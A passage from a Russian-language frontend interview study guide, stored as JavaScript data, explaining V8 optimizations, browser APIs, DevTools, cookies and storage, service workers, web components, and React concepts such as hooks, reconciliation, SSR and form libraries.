Полиморфный код (разные типы в одном месте) → частые деоптимизации → медленно
Большие бандлы → lazy parsing экономит время старта → code splitting помогает
eval(), with, arguments в некоторых случаях отключают оптимизации TurboFan`,score:3},{name:"Преобразование классов в рантайме. Приватные и статичные поля",level:"4",content:`**Преобразование класса:**
\`\`\`js
class User {
  constructor(name) { this.name = name; }
  greet() { ... }         // → User.prototype.greet
  static create() { ... } // → User.create (на самой функции)
}
\`\`\`

**Приватные поля (#):**
\`\`\`js
class User {
  #password = '123';
  changePassword(p) { this.#password = p; } // можно изнутри
}
user.#password; // SyntaxError! Снаружи недоступно
\`\`\`

**3 способа приватности:**
1. \`_\` — соглашение (не настоящая приватность)
2. \`WeakMap\` — настоящая, но громоздко
3. \`#\` — настоящая, встроенная в язык`,score:3},{name:"Оптимизации в V8: Скрытые классы, Inline Caching",level:"4",content:`**Скрытые классы (Hidden Classes)**

**Hashmap** — структура данных "ключ → значение". При чтении \`obj.name\` нужно вычислить хэш строки "name", найти ячейку, разрешить коллизии. Это O(1) в среднем, но с константными накладными расходами на каждое обращение.

V8 не хранит свойства объекта как hashmap — это медленно. Вместо этого он назначает каждому объекту Hidden Class (внутреннее описание формы) — какие свойства есть и по какому смещению в памяти. Тогда \`obj.name\` читается напрямую по смещению — как поле структуры в C, без хэширования.

\`\`\`js
const user = {};        // Hidden Class C0: {}
user.name = 'Alice';    // → C1: { name: offset 0 }
user.age = 25;          // → C2: { name: offset 0, age: offset 8 }
\`\`\`

Два объекта с **одинаковым порядком добавления свойств** разделяют один Hidden Class → V8 переиспользует оптимизации для обоих.

\`\`\`js
// ✅ Оба получат один Hidden Class C2
const a = {}; a.x = 1; a.y = 2;
const b = {}; b.x = 5; b.y = 10;

// ❌ Разные Hidden Classes — разный порядок свойств
const c = {}; c.x = 1; c.y = 2;
const d = {}; d.y = 2; d.x = 1;
\`\`\`

**Практика:** инициализировать все свойства в конструкторе в одинаковом порядке. Динамическое добавление свойств в разном порядке дробит оптимизации.

**delete — опасен:**
Удаление свойства переводит объект в **dictionary mode** (slow mode) — V8 переходит на настоящий hashmap, теряет скрытый класс. Вместо delete → присвой \`undefined\` или \`null\`.

---

**Inline Caching (IC)**

IC — оптимизация на уровне JIT. Каждый раз когда V8 впервые выполняет операцию вроде \`obj.prop\`, он не знает что там внутри — и делает полный поиск. Но он запоминает: "здесь был объект с Hidden Class C2, свойство prop — на смещении 8". При следующем вызове просто проверяет класс и читает по смещению — без хэширования, без поиска.

Проблема возникает когда в одно и то же место кода приходят объекты **разных форм**. V8 должен хранить кэш для каждой встреченной формы — и с каждой новой формой кэш становится дороже:

\`\`\`js
function getX(obj) { return obj.x; }

getX({ x: 1 });           // 1-я форма → IC: Uninitialized → Monomorphic
getX({ x: 2, y: 3 });     // 2-я форма → IC: Monomorphic → Polymorphic
getX({ a: 1, x: 4 });     // 3-я форма → IC: Polymorphic (растёт)
// ... 5+ форм → Megamorphic: кэш выброшен, каждый вызов — полный поиск
\`\`\`

Стадии — это не настройки, а **состояние кэша**. V8 сам переводит IC вперёд по мере того как видит новые формы:

- **Uninitialized** — функция ещё не вызывалась
- **Monomorphic** — одна форма → максимально быстро, кэш из одной записи
- **Polymorphic** — 2–4 формы → кэш на несколько вариантов, сравниваются линейно
- **Megamorphic** — 5+ форм → кэш выброшен, V8 ходит в глобальную хэш-таблицу

**Назад IC не откатывается.** Функция ставшая Megamorphic остаётся такой до следующей перекомпиляции — V8 переключается обратно на hashmap (полный поиск по хэшу при каждом обращении), теряя все преимущества скрытых классов. Поэтому утилитарные функции которые принимают любые объекты (lodash, Object.assign) сознательно написаны так чтобы не полагаться на IC.`,score:3.5},{name:"Proxy и Reflect",level:"4",content:`**Proxy** — обёртка вокруг объекта, которая перехватывает операции над ним. Сам объект не меняется — ты работаешь с прокси, а прокси решает что делать дальше.

\`\`\`js
const handler = {
  get(target, prop, receiver) {
    console.log(\`читаем \${prop}\`);
    return Reflect.get(target, prop, receiver); // стандартное поведение
  },
  set(target, prop, value, receiver) {
    if (typeof value !== 'number') throw new TypeError('только числа');
    return Reflect.set(target, prop, value, receiver);
  },
};

const proxy = new Proxy({}, handler);
proxy.x = 42;   // OK
proxy.x = 'hi'; // TypeError
\`\`\`

**Полный список ловушек** (каждая перехватывает свою операцию):
\`\`\`js
get(target, prop, receiver)              // obj.prop
set(target, prop, value, receiver)       // obj.prop = value
has(target, prop)                        // 'prop' in obj
deleteProperty(target, prop)             // delete obj.prop
apply(target, thisArg, args)             // fn()
construct(target, args)                  // new Fn()
ownKeys(target)                          // Object.keys(), for...in
defineProperty(target, key, desc)        // Object.defineProperty
getOwnPropertyDescriptor(target, key)    // Object.getOwnPropertyDescriptor
getPrototypeOf(target)                   // Object.getPrototypeOf
setPrototypeOf(target, proto)            // Object.setPrototypeOf
isExtensible(target)                     // Object.isExtensible
preventExtensions(target)                // Object.preventExtensions
\`\`\`

---

**Reflect** — зеркало операций JS. Для каждой ловушки Proxy есть соответствующий метод Reflect с той же сигнатурой.

Зачем не просто \`target[prop]\`:
\`\`\`js
// ❌ Без Reflect — теряем receiver, this в геттере будет target, а не proxy
get(target, prop) {
  return target[prop]; // если prop — геттер, this внутри = target
}

// ✅ С Reflect — receiver (прокси) правильно передаётся как this
get(target, prop, receiver) {
  return Reflect.get(target, prop, receiver);
}
\`\`\`
Это критично когда объект наследует геттеры — без receiver они сломаются.

---

**Инварианты Proxy:**
Proxy не может нарушать объектную модель JS. Если свойство \`non-configurable + non-writable\`, get-ловушка обязана вернуть то же значение что в target — иначе TypeError. Движок принудительно проверяет это независимо от твоего кода.

**Proxy.revocable():**
\`\`\`js
const { proxy, revoke } = Proxy.revocable(target, handler);
revoke(); // proxy мёртв → TypeError на любую операцию
\`\`\`
Кейс: временный доступ к объекту. После revoke все ссылки на proxy бесполезны — данные не утекут.

**Где используется:** Vue 3 реактивность (перехват get/set для отслеживания зависимостей), MobX, валидация данных, логирование, мемоизация.`,score:3},{name:"Map, Set, WeakMap, WeakSet",level:"3",content:`**Map** — коллекция ключ-значение. Ключом может быть что угодно (объект, функция, NaN):
\`\`\`js
const map = new Map();
map.set('key', 'value');
map.set(obj, 42);        // объект как ключ
map.get('key');          // 'value'
map.has('key');          // true
map.delete('key');
map.size;                // кол-во записей

// Итерация:
for (const [key, value] of map) { ... }
map.forEach((value, key) => { ... });
[...map.keys()], [...map.values()], [...map.entries()]
\`\`\`
Map vs Object: Map сохраняет порядок вставки, не имеет прототипных ключей, удобнее для итерации.

**Set** — коллекция уникальных значений:
\`\`\`js
const set = new Set([1, 2, 2, 3]); // Set {1, 2, 3}
set.add(4);
set.has(2);   // true
set.delete(2);
set.size;     // 3

// Удаление дублей из массива:
const unique = [...new Set(arr)];
\`\`\`

**WeakMap** — как Map, но:
• Ключи — только объекты
• Слабые ссылки — если объект-ключ больше нигде не используется, GC его удалит вместе с записью
• Нет итерации, нет size
\`\`\`js
const cache = new WeakMap();
cache.set(domNode, computedData); // удалится вместе с domNode
\`\`\`
Кейсы: кэш данных привязанный к объекту, приватные данные классов без утечек памяти.

**WeakSet** — как Set, но только объекты, слабые ссылки, нет итерации:
\`\`\`js
const seen = new WeakSet();
seen.add(obj);
seen.has(obj); // true
\`\`\`
Кейс: отмечать объекты как "обработанные" без удержания в памяти.

**Ключевое отличие Weak-версий:** не мешают сборщику мусора — объект удалится как только исчезнут все остальные ссылки на него.`,score:3.5}]},{id:"browser",title:"БРАУЗЕР И ЕГО ИНСТРУМЕНТЫ",icon:"🌐",color:"#4FC3F7",topics:[{name:"devTools (network, application)",level:"2",content:`**Network:** мониторинг HTTP-запросов, время загрузки, размеры, заголовки, тело ответа. Фильтрация по типу (XHR, JS, CSS, Img). Throttling (3G, offline).

**Application:** cookies, localStorage, sessionStorage, IndexedDB, Service Workers, Cache Storage, Manifests.

**Performance:** запись и анализ производительности, flame chart, CPU profiling.

**Elements:** DOM-дерево, стили, computed styles, box model.

**Console:** логирование, выполнение JS, фильтрация по уровням.

**Memory:** heap snapshots (сравнивать до/после — найти утечки), allocation timeline (что создаётся и удерживается), retained size — реальная память с учётом удерживаемых объектов.

**Coverage:** показывает % неиспользуемого JS/CSS при загрузке страницы. Помогает найти что вынести в lazy-load.

**Local Overrides:** редактировать файлы сайта прямо в DevTools — изменения переживают перезагрузку страницы. Удобно для экспериментов без локального сервера.

**Recorder:** запись пользовательских сценариев → воспроизведение → экспорт в Playwright/Puppeteer скрипты.`},{name:"breakpoints",level:"2",content:`**Типы breakpoints в DevTools:**

• **Line breakpoint** — пауза на конкретной строке кода
• **Conditional breakpoint** — срабатывает при условии (\`user.id === 5\`)
• **DOM breakpoint** — при изменении DOM-узла (subtree, attributes, node removal)
• **XHR/Fetch breakpoint** — при запросе к определённому URL
• **Event listener breakpoint** — при определённом событии (click, scroll)
• **Exception breakpoint** — при выбросе исключения

**Отладка:** Step over (F10), Step into (F11), Step out (Shift+F11), Resume (F8).

**Watch expressions** — отслеживание переменных. **Call Stack** — стек вызовов. **Scope** — текущие переменные.`},{name:"Всплытие и погружение событий",level:"2",content:`**3 фазы события:**
1. **Capturing (погружение)** — от window вниз к целевому элементу
2. **Target** — событие на целевом элементе
3. **Bubbling (всплытие)** — от целевого элемента вверх к window

\`\`\`js
el.addEventListener('click', handler, true);  // capturing
el.addEventListener('click', handler, false); // bubbling (по умолчанию)
\`\`\`

**event.stopPropagation()** — останавливает всплытие/погружение
**event.stopImmediatePropagation()** — + отменяет остальные обработчики на этом элементе
**event.preventDefault()** — отменяет действие по умолчанию (НЕ останавливает всплытие)

**Делегирование событий:** вешаем один обработчик на родителя, проверяем \`event.target\`.`},{name:"Основные браузерные события",level:"2",content:`**Mouse:** click, dblclick, mousedown, mouseup, mousemove, mouseenter, mouseleave, contextmenu
**Keyboard:** keydown, keyup, keypress (deprecated)
**Form:** submit, input, change, focus, blur
**Document:** DOMContentLoaded, load, beforeunload, unload
**Scroll/Resize:** scroll, resize
**Clipboard:** copy, paste, cut
**Touch:** touchstart, touchmove, touchend
**Drag:** dragstart, drag, dragend, dragover, drop

**DOMContentLoaded** — DOM готов, стили/картинки могут ещё грузиться
**load** — всё загружено (включая картинки, стили)

**Passive listeners:** \`{ passive: true }\` — обработчик не вызовет preventDefault(), браузер может оптимизировать скролл.`},{name:"Что такое DOM. JS Методы работы с узлами",level:"2",content:`**DOM (Document Object Model)** — древовидное представление HTML-документа. Каждый HTML-тег — узел (node).

**Поиск:**
\`\`\`js
document.getElementById('id')
document.querySelector('.class')      // первый
document.querySelectorAll('.class')   // все (статическая коллекция)
document.getElementsByClassName()     // живая коллекция
\`\`\`

**Создание/модификация:**
\`\`\`js
document.createElement('div')
element.append(child)      // в конец
element.prepend(child)     // в начало
element.before(sibling)    // перед
element.after(sibling)     // после
element.remove()           // удалить
element.cloneNode(true)    // глубокое клонирование
\`\`\`

**Атрибуты:** getAttribute, setAttribute, removeAttribute, dataset (data-*).
**Классы:** classList.add, remove, toggle, contains.

**DocumentFragment** — лёгкий узел вне DOM. Добавляй элементы пакетно, потом вставь один раз → один reflow:
\`\`\`js
const frag = document.createDocumentFragment();
items.forEach(item => {
  const li = document.createElement('li');
  li.textContent = item;
  frag.appendChild(li);
});
list.appendChild(frag); // единственный reflow
\`\`\`

**MutationObserver** — следит за изменениями в DOM (замена устаревшего MutationEvents):
\`\`\`js
const observer = new MutationObserver((mutations) => {
  mutations.forEach(m => console.log(m.type, m.addedNodes, m.attributeName));
});
observer.observe(element, {
  childList: true,    // добавление/удаление дочерних узлов
  subtree: true,      // всё поддерево
  attributes: true,   // изменения атрибутов
  characterData: true // изменения текстового контента
});
observer.disconnect();
\`\`\`
Используется в: React DevTools, rich text редакторах, analytics трекерах.`},{name:"iframe",level:"3",content:`**iframe** — встраивает другую HTML-страницу внутрь текущей.

\`\`\`html
<iframe src="https://example.com" sandbox="allow-scripts"></iframe>
\`\`\`

**Безопасность:**
• **sandbox** — ограничивает возможности: allow-scripts, allow-same-origin, allow-forms, allow-popups
• **Same-Origin Policy** — доступ к содержимому iframe только с того же домена
• **postMessage** — безопасное общение между окнами разных доменов

\`\`\`js
// Родитель → iframe
iframe.contentWindow.postMessage(data, 'https://target.com');

// iframe → родитель
window.parent.postMessage(data, 'https://parent.com');

// Приём
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://trusted.com') return;
  console.log(e.data);
});
\`\`\`

**X-Frame-Options** — заголовок, запрещающий встраивание сайта в iframe.`},{name:"Отладка WebSocket в браузере",level:"3",content:`В DevTools → Network → вкладка **WS** (WebSocket):
• Видны все WebSocket-соединения
• **Messages** — отправленные (зелёные) и полученные (красные) сообщения
• **Headers** — заголовки handshake (Upgrade: websocket)
• **Timing** — время установки соединения

Можно фильтровать по содержимому сообщений, видеть бинарные данные. Полезно для дебага real-time приложений (чаты, уведомления, торговые платформы).`},{name:"Базовое понимание cookies",level:"3",content:`**Cookies** — маленькие текстовые данные, отправляемые с каждым HTTP-запросом.

\`\`\`js
document.cookie = "name=value; max-age=3600; path=/; secure; samesite=strict";
\`\`\`

**Атрибуты:**
• **max-age / expires** — время жизни
• **path** — для какого пути доступна
• **domain** — для какого домена
• **secure** — только по HTTPS
• **httpOnly** — недоступна из JS (защита от XSS)
• **SameSite** — strict/lax/none (защита от CSRF)

**Ограничения:** ~4KB на cookie, ~20 cookies на домен.

**Типы:** Session cookies (без max-age, до закрытия браузера), Persistent (с max-age), Third-party (с другого домена — для трекинга).`},{name:"localStorage и sessionStorage",level:"3",content:`**localStorage:** данные сохраняются навсегда (до явного удаления)
**sessionStorage:** данные живут до закрытия вкладки

\`\`\`js
localStorage.setItem('key', JSON.stringify(data));
const data = JSON.parse(localStorage.getItem('key'));
localStorage.removeItem('key');
localStorage.clear();
\`\`\`

**Ограничения:** ~5-10MB, только строки, синхронный API (может блокировать).

**Отличия от cookies:**
• Не отправляются на сервер с каждым запросом
• Больше объём (5MB vs 4KB)
• Нет атрибутов безопасности (httpOnly, secure)

**Событие storage:** срабатывает в ДРУГИХ вкладках при изменении localStorage. Можно использовать для синхронизации между вкладками.`},{name:"Базовое понимание Selection и Range",level:"3",content:`**Range** — объект, представляющий фрагмент документа (от точки A до точки B).

\`\`\`js
const range = document.createRange();
range.setStart(node, offset);
range.setEnd(node, offset);
range.selectNodeContents(element);
\`\`\`

**Selection** — то, что выделил пользователь.

\`\`\`js
const selection = window.getSelection();
selection.toString();        // текст выделения
selection.getRangeAt(0);     // Range объект
selection.removeAllRanges(); // снять выделение
selection.addRange(range);   // программно выделить
\`\`\`

Применение: редакторы текста, подсветка поиска, кастомные контекстные меню.`},{name:"Особенности работы с браузерными событиями",level:"3",content:`**Throttle** — не чаще чем раз в N мс (scroll, resize).
**Debounce** — ждёт N мс после последнего вызова (input поиска).

**Passive listeners:**
\`\`\`js
el.addEventListener('scroll', handler, { passive: true });
\`\`\`
Обещаем не вызывать preventDefault() → браузер оптимизирует скролл.

**Event delegation:**
\`\`\`js
table.addEventListener('click', (e) => {
  const td = e.target.closest('td');
  if (!td || !table.contains(td)) return;
  highlight(td);
});
\`\`\`

**Custom Events:**
\`\`\`js
const event = new CustomEvent('myEvent', { detail: { id: 1 }, bubbles: true });
element.dispatchEvent(event);
\`\`\`

**once: true** — обработчик вызовется один раз и удалится автоматически.`},{name:"Живые коллекции, методы обработки и преобразования в массив",level:"3",content:`**Живая коллекция** — автоматически обновляется при изменении DOM:
\`\`\`js
const divs = document.getElementsByTagName('div'); // живая
// Добавили div → divs.length увеличится
\`\`\`

**Статическая коллекция** — снимок на момент вызова:
\`\`\`js
const divs = document.querySelectorAll('div'); // статическая
// Добавили div → divs.length НЕ изменится
\`\`\`

**Преобразование в массив:**
\`\`\`js
Array.from(collection)
[...collection]
Array.prototype.slice.call(collection)
\`\`\`

Живые: getElementsByClassName, getElementsByTagName, children
Статические: querySelectorAll`},{name:"Service workers",level:"4",content:`**Service Worker** — скрипт, работающий в фоне, отдельно от страницы.

\`\`\`js
navigator.serviceWorker.register('/sw.js');

// sw.js
self.addEventListener('install', (e) => {
  e.waitUntil(caches.open('v1').then(c => c.addAll(['/index.html', '/app.js'])));
});

self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then(r => r || fetch(e.request))
  );
});
\`\`\`

**Возможности:** кэширование (офлайн), push-уведомления, фоновая синхронизация.
**Ограничения:** только HTTPS, нет доступа к DOM, асинхронный API.`},{name:"Web-workers",level:"4",content:`**Web Worker** — выполнение JS в отдельном потоке.

\`\`\`js
// main.js
const worker = new Worker('worker.js');
worker.postMessage({ data: bigArray });
worker.onmessage = (e) => console.log(e.data);

// worker.js
self.onmessage = (e) => {
  const result = heavyComputation(e.data);
  self.postMessage(result);
};
\`\`\`

**Ограничения:** нет доступа к DOM, window, document. Общение только через postMessage (сериализация).

**SharedWorker** — один воркер на несколько вкладок.
**Transferable Objects** — передача данных без копирования (ArrayBuffer).`},{name:"Как веб-приложение превратить в PWA",level:"4",content:`**PWA (Progressive Web App)** — веб-приложение с нативными возможностями.

**3 требования:**
1. **HTTPS** — обязательно
2. **Service Worker** — кэширование, офлайн
3. **Web App Manifest** — метаданные приложения

\`\`\`json
// manifest.json
{
  "name": "My App",
  "short_name": "App",
  "start_url": "/",
  "display": "standalone",
  "theme_color": "#000",
  "icons": [{ "src": "icon.png", "sizes": "192x192" }]
}
\`\`\`

**Возможности:** установка на домашний экран, push-уведомления, офлайн-работа, фоновая синхронизация.

**Стратегии кэширования:** Cache First, Network First, Stale While Revalidate.`},{name:"WebComponents, ShadowDOM, Custom Elements",level:"4",content:`**Custom Elements:**
\`\`\`js
class MyButton extends HTMLElement {
  connectedCallback() { this.innerHTML = '<button>Click</button>'; }
}
customElements.define('my-button', MyButton);
\`\`\`

**Shadow DOM** — инкапсулированное DOM-дерево, изолированное от внешних стилей:
\`\`\`js
const shadow = this.attachShadow({ mode: 'open' });
shadow.innerHTML = '<style>p { color: red; }</style><p>Isolated</p>';
\`\`\`

**HTML Templates:**
\`\`\`html
<template id="tmpl"><p>Reusable content</p></template>
\`\`\`
\`\`\`js
const tmpl = document.getElementById('tmpl');
const clone = tmpl.content.cloneNode(true);
shadow.appendChild(clone);
\`\`\`

**Slots** — точки вставки контента извне в Shadow DOM.`}]},{id:"react",title:"REACT",icon:"⚛️",color:"#61DAFB",topics:[{name:"Компоненты, свойства: Props, State, однонаправленный поток данных",level:"2",content:`**Однонаправленный поток:** данные (props) текут сверху вниз. Обратно — через колбэки.

**Props** — неизменяемы (read-only), передаются от родителя.
**State** — принадлежит компоненту, изменяется через setter, вызывает ререндер.

**Ререндер дочерних:** по умолчанию ВСЕ дети ререндерятся при ререндере родителя. React.memo — предотвращает, если props не изменились.

**Ловушка с memo + колбэками:** новая функция каждый ререндер → новая ссылка → memo бесполезен. Решение: useCallback.`,score:4.5},{name:"Особенности синтаксиса JSX",level:"2",content:"**JSX → React.createElement(type, props, children) → объект (React-элемент)**\n\n`className` вместо `class` (зарезервированное слово), `htmlFor` вместо `for`.\n\nВ React 17+ — `_jsx()` вместо createElement, не нужен `import React`.",score:4},{name:"Хуки: встроенные и пользовательские",level:"2",content:`**useState** — состояние компонента
**useEffect** — побочные эффекты (API, подписки)
**useMemo** — мемоизация результата вычисления
**useCallback** — мемоизация функции (= useMemo(() => fn, deps))
**useRef** — ссылка на DOM / хранение данных без ререндера
**useContext** — потребление контекста
**useReducer** — сложное состояние (как мини-Redux)
**useTransition** — помечает обновление как низкоприоритетное (UI не зависает при тяжёлых ререндерах)
**useLayoutEffect** — как useEffect, но синхронно после мутации DOM до отрисовки. Для измерения DOM и предотвращения визуального мерцания. Стоит дороже useEffect.
**useId** — стабильный уникальный ID для пары label/input. Решает проблему гидратации при SSR:
\`\`\`js
const id = useId();
return <><label htmlFor={id}>Name</label><input id={id} /></>;
\`\`\`
**useImperativeHandle(ref, () => api, deps)** — выставить наружу только нужные методы:
\`\`\`js
const Input = forwardRef((props, ref) => {
  const inputRef = useRef();
  useImperativeHandle(ref, () => ({
    focus: () => inputRef.current.focus(),
    clear: () => { inputRef.current.value = ''; }
  }));
  return <input ref={inputRef} />;
});
// Родитель: ref.current.focus() — только выставленное API
\`\`\`
**useSyncExternalStore(subscribe, getSnapshot)** — подписка на внешние сторы с поддержкой Concurrent Mode. Именно так работают Zustand, Redux Toolkit, Jotai.

**Правила хуков:**
1. Только на верхнем уровне (не в if/for/вложенных функциях)
2. Префикс \`use\`
React запоминает хуки по **порядку вызова**.`,score:4},{name:"Жизненный цикл компонента",level:"2",content:`**3 фазы:** Mounting → Updating → Unmounting

**useEffect маппинг:**
\`\`\`js
useEffect(() => { ... }, []);     // componentDidMount
useEffect(() => { ... }, [dep]);  // componentDidUpdate (для dep)
useEffect(() => {
  return () => { ... };           // componentWillUnmount
}, []);
\`\`\`

**shouldComponentUpdate** → React.memo (для функциональных).`,score:4},{name:"Фрагменты",level:"2",content:"Группировка без лишнего DOM-узла: `<Fragment>` или `<>...</>`.\n\n`<>` — нельзя передать key. `<Fragment key={id}>` — можно. Единственный случай для полного Fragment — списки.",score:5},{name:"Компоненты высшего порядка",level:"3",content:`**HOC** — функция, принимающая компонент → возвращающая новый с расширенной функциональностью.

\`\`\`jsx
function withAuth(Component) {
  return function(props) {
    if (!useAuth()) return <Redirect to="/login" />;
    return <Component {...props} />;
  };
}
const ProtectedPage = withAuth(Dashboard);
\`\`\`

HOC не изменяет оригинальный компонент, а оборачивает. Сейчас заменён хуками.`,score:4},{name:"Virtual DOM",level:"3",content:`**Зачем нужен Virtual DOM**

Прямые операции с реальным DOM дорогие — каждое изменение может вызвать reflow и repaint. Если при каждом обновлении состояния перерисовывать весь UI через innerHTML, это будет крайне медленно.

Virtual DOM — это легковесный JS-объект, который описывает как должен выглядеть DOM:
\`\`\`js
// JSX <div className="box"><p>Hello</p></div>
// компилируется в:
{
  type: 'div',
  props: { className: 'box' },
  children: [{ type: 'p', props: {}, children: ['Hello'] }]
}
\`\`\`

При изменении состояния React строит новое дерево VDOM и сравнивает его со старым — это называется **diffing**. В реальный DOM попадают только минимальные изменения.

**Reconciliation — алгоритм сравнения деревьев**

Наивный diff двух деревьев — O(n³). React использует эвристики и делает это за O(n):

**1. Разный тип элемента → снести поддерево и построить заново:**
\`\`\`jsx
// было:
<div><Counter /></div>
// стало:
<span><Counter /></span>
\`\`\`
React видит div → span: старый DOM-узел удаляется. Все дочерние компоненты (Counter) вызывают componentWillUnmount / cleanup useEffect. Их state уничтожается. Новое поддерево монтируется с нуля — componentDidMount / useEffect запускаются заново.

**2. Одинаковый тип DOM-элемента → обновить только изменившееся:**
\`\`\`jsx
// было: <div className="old" title="x" />
// стало: <div className="new" />
\`\`\`
DOM-узел тот же — React только патчит атрибуты (className меняет, title удаляет). Дочерние компоненты продолжают жить, их state сохраняется — рекурсивно применяется тот же алгоритм.

**2б. Одинаковый тип компонента → обновить props, перерендерить:**
\`\`\`jsx
// было: <Counter step={1} />
// стало: <Counter step={2} />
\`\`\`
Экземпляр компонента тот же — React обновляет props и вызывает рендер. State сохраняется. Запускается useEffect у которого изменились deps.

**3. Списки → React не знает что с чем сопоставить без key:**
\`\`\`jsx
// Без key при добавлении в начало React перерисует все элементы
// С key React знает: этот элемент переместился, а не пересоздался
[<li key="a">A</li>, <li key="b">B</li>]
\`\`\`
С правильным key: компонент переместился → React переиспользует экземпляр, state сохраняется. Без key или с изменившимся key: компонент считается новым → полный unmount + mount, state теряется.

**Почему index как key — антипаттерн:**
\`\`\`jsx
// Список: [A(0), B(1), C(2)]
// Вставили в начало D: [D(0), A(1), B(2), C(3)]
// React видит: key=0 изменился (был A, стал D) → обновляет
// Все элементы "изменились" → лишние ререндеры + баги со state инпутов
\`\`\`
Key должен быть стабильным уникальным идентификатором из данных (id из БД, slug и т.д.).

**VDOM — не бесплатный:**
Создание и сравнение VDOM тоже стоит памяти и CPU. Для очень простых случаев (статичные страницы, частые мелкие обновления) прямые DOM-операции могут быть быстрее. Svelte и Solid.js отказались от VDOM в пользу компиляции в точечные DOM-обновления.`,score:4},{name:"Способы оптимизации React-приложения",level:"3",content:`1. **memo/useMemo/useCallback** — мемоизация (применять предметно!)
2. **React.lazy + Suspense** — code splitting
3. **Виртуализация списков** — react-window, react-virtualized
4. **Колокализация стейта** — стейт ближе к месту использования
5. **Стейт-менеджеры** — точечная подписка на данные`,score:3.5},{name:"Предохранители (ErrorBoundary)",level:"3",content:`Классовый компонент, ловит ошибки в рендере и жизненном цикле дочерних.

**НЕ ловит:**
• Обработчики событий (onClick и т.д.)
• Асинхронный код (setTimeout, fetch)
• SSR
• Ошибки в самом ErrorBoundary

Можно размещать на разных уровнях дерева — если секция упадёт, остальное работает.`,score:3},{name:"Порталы и как ими пользоваться",level:"3",content:"```jsx\nimport { createPortal } from 'react-dom';\ncreatePortal(<Modal />, document.getElementById('modal-root'));\n```\n\nМонтирует в другой DOM-узел, но события всплывают по **React-дереву** (не DOM-дереву).",score:4},{name:"React Context",level:"3",content:`Решает **prop drilling**. createContext → Provider (value) → useContext.

**Проблема:** изменение value → ВСЕ подписчики ререндерятся. React.memo НЕ помогает (контекст обходит memo).

**Решение:** разделить на отдельные контексты (UserContext, ThemeContext).`,score:4.5},{name:"Концепция SSR. Ограничения применения",level:"3",content:`**CSR vs SSR**

CSR (Client-Side Rendering) — браузер получает пустой HTML и JS-бандл, React строит DOM на клиенте. Пользователь видит белый экран пока JS не загрузится и не выполнится.

SSR (Server-Side Rendering) — сервер запускает React, генерирует готовый HTML и отдаёт его. Браузер показывает контент сразу — ещё до загрузки JS.

**Как работает SSR + гидратация:**
\`\`\`
1. Запрос → сервер рендерит компоненты в HTML-строку
2. Браузер получает готовый HTML → показывает контент (FCP быстрый)
3. JS-бандл загружается
4. hydrateRoot() — React "оживляет" существующий DOM:
   привязывает обработчики событий, восстанавливает state
5. Страница становится интерактивной (TTI)
\`\`\`
Между шагами 2 и 5 — страница выглядит готовой, но не интерактивна. Это называется **hydration gap**.

**React API:**
\`\`\`js
// Клиент CSR:
creatRoot(document.getElementById('root')).render(<App />);

// Клиент SSR — гидратация существующего DOM:
hydrateRoot(document.getElementById('root'), <App />);

// Сервер (старый, синхронный — блокирует поток):
const html = renderToString(<App />);

// Сервер (React 18, стриминг — отдаёт HTML по частям):
const { pipe } = renderToPipeableStream(<App />, {
  onShellReady() { pipe(response); }
});
\`\`\`

**Streaming SSR** — сервер начинает отдавать HTML не дожидаясь рендера всей страницы. Работает вместе с \`<Suspense>\`: тяжёлые части стримятся позже, оболочка приходит сразу.

**Плюсы SSR:**
• Быстрый FCP — пользователь видит контент без ожидания JS
• SEO — поисковики получают готовый HTML
• Работает без JS на клиенте

**Ограничения и минусы:**
• Нет \`window\`, \`document\`, \`localStorage\` на сервере — весь браузерный API недоступен
• Увеличенный TTFB — сервер должен отрендерить прежде чем отдать
• Нагрузка на сервер — React выполняется при каждом запросе
• Гидратация должна дать идентичный DOM — расхождение сервер/клиент вызывает ошибки и полный перерендер
• Сложнее деплой — нужен Node.js сервер, не просто CDN

**Когда SSR оправдан:** публичные страницы с важным SEO, медленные устройства/соединения, контент-сайты. Для дашбордов за авторизацией — CSR проще и достаточно.`,score:3.5},{name:"Form managers",level:"3",content:`**Контролируемые компоненты:** значение в state, React управляет вводом. Каждый keystroke → setState → ререндер.
\`\`\`jsx
const [value, setValue] = useState('');
<input value={value} onChange={e => setValue(e.target.value)} />
\`\`\`
**Неконтролируемые компоненты:** DOM хранит значение, React читает через ref когда нужно.
\`\`\`jsx
const ref = useRef();
<input ref={ref} defaultValue="initial" />
// При сабмите: ref.current.value
\`\`\`

**React Hook Form** — работает через неконтролируемые компоненты + \`register\` (ref под капотом). React не знает о значениях полей до сабмита — ререндер только при ошибках валидации и сабмите. Производительный выбор для больших форм.

**Formik** — контролируемые компоненты, значение каждого поля в state. Каждый keystroke → setState → ререндер всей формы. При 20+ полях начинает тормозить. Зато проще для понимания и работы с зависимыми полями.

**Главное отличие:** RHF читает значения из DOM через refs в момент сабмита. Formik держит все значения в React state всё время — отсюда разница в производительности.

**Валидация схемами:**
\`\`\`js
const schema = z.object({
  email: z.string().email(),
  age: z.number().min(18)
});
const { register, handleSubmit, formState: { errors } } = useForm({
  resolver: zodResolver(schema)
});
\`\`\`

**React 19 — Server Actions**

Server Action — async-функция с директивой \`'use server'\`, которая выполняется на сервере. Вызывается с клиента как обычная функция, но запрос уходит на сервер автоматически — без fetch, без API-роута.

\`\`\`jsx
// actions.ts (серверный код)
'use server';
export async function saveUser(formData: FormData) {
  await db.users.create({ name: formData.get('name') });
  revalidatePath('/users'); // инвалидировать кэш Next.js
}
\`\`\`

\`\`\`jsx
// Вариант 1 — нативная форма (работает даже без JS на клиенте):
<form action={saveUser}>
  <input name="name" />
  <button>Save</button>
</form>

// Вариант 2 — программный вызов:
<button onClick={() => saveUser(formData)}>Save</button>
\`\`\`

**useActionState** — отслеживает состояние Server Action (pending, error, result):
\`\`\`jsx
const [state, formAction, isPending] = useActionState(saveUser, null);

<form action={formAction}>
  <input name="name" />
  <button disabled={isPending}>
    {isPending ? 'Сохраняем...' : 'Save'}
  </button>
  {state?.error && <p>{state.error}</p>}
</form>
\`\`\`

**Плюсы:** нет boilerplate с fetch/useState/loading, прогрессивное улучшение (форма работает без JS), серверный код не попадает в бандл клиента, типобезопасность end-to-end.

**Ограничения:** только в серверных окружениях (Next.js App Router, Remix и т.д.). В чистом React без фреймворка — не работает.`,score:3},{name:"React паттерны. Compound components. render-props",level:"4",content:`**Compound Components:** набор связанных компонентов через Context.
\`\`\`jsx
<Table>
  <Table.Header><Table.Cell>Name</Table.Cell></Table.Header>
  <Table.Row><Table.Cell>Alice</Table.Cell></Table.Row>
</Table>
